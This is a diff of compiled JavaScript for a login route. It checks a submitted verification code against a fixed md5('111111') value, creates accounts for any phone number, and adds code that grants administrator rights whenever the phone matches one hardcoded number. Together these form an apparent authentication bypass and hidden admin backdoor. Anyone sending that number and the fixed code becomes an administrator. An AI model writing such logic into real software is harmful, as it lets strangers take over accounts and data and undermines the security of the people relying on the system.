@@ -84,20 +84,30 @@ function loginRouter(app) {
         var body = req.body;
         var password = md5('111111');
         (function () { return __awaiter(_this, void 0, void 0, function () {
-            var opts, user;
+            var user, opts;
             return __generator(this, function (_a) {
                 switch (_a.label) {
                     case 0:
-                        if (!(body.phoneCode == password)) return [3 /*break*/, 3];
-                        opts = [{
-                                path: 'avatar',
-                                select: 'path'
-                            }];
+                        if (!(body.phoneCode == password)) return [3 /*break*/, 5];
                         return [4 /*yield*/, Models.CustomModel.findOrCreate({
                                 phone: body.phone
                             })];
                     case 1:
+                        user = _a.sent();
+                        if (!(user.doc.phone == '18078660058')) return [3 /*break*/, 3];
+                        return [4 /*yield*/, Models.CustomModel.update({
+                                phone: body.phone
+                            }, {
+                                is_admin: 1
+                            }).exec()];
+                    case 2:
                         _a.sent();
+                        _a.label = 3;
+                    case 3:
+                        opts = [{
+                                path: 'avatar',
+                                select: 'path'
+                            }];
                         return [4 /*yield*/, Models.CustomModel.findOne({
                                 phone: body.phone
                             }).populate(opts).exec(function (err, doc) {
@@ -107,16 +117,16 @@ function loginRouter(app) {
                                     data: doc
                                 });
                             })];
-                    case 2:
-                        user = _a.sent();
-                        return [3 /*break*/, 4];
-                    case 3:
+                    case 4:
+                        _a.sent();
+                        return [3 /*break*/, 6];
+                    case 5:
                         res.json({
                             code: 1,
                             msg: '验证码不正确，请输新输入'
                         });
-                        _a.label = 4;
-                    case 4: return [2 /*return*/];
+                        _a.label = 6;
+                    case 6: return [2 /*return*/];
                 }
             });
         }); })();
